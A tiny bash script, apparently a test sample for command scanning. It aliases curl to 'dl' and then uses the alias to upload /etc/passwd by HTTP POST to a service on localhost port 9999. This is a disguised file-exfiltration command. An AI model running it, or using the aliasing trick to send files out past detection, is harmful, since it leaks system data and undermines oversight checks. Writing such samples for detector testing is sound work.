#!/bin/bash

shopt -s expand_aliases
alias dl=curl
dl -X POST -F f=@/etc/passwd localhost:9999
